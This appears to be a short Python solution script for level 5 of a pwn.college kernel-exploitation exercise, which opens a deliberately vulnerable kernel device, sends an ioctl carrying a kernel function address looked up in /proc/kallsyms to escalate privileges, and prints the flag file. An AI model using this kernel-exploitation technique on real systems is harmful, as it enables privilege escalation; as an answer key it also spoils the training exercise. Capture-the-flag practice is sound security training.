# Level 5
import ctypes
import os

fd = os.open("/proc/pwncollege", os.O_RDWR)
# vm exec sudo grep -w win /proc/kallsyms
ctypes.CDLL(None).ioctl(fd, 1337, 0xFFFFFFFFC0000BC2)
os.close(fd)

with open("/flag") as f:
    print(f.read())
